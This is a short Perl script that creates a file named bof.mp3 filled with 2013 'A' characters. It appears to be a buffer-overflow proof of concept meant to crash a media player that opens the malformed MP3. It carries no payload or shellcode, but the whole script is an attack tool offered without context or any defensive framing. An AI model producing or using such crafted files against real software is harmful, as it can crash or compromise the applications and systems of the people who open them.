#!/usr/bin/perl
 
$bof = "A" x 2013;
$filename = "bof.mp3";
open (FILE,">$filename");
print FILE "$bof";
print "\ncreated!!!\n";
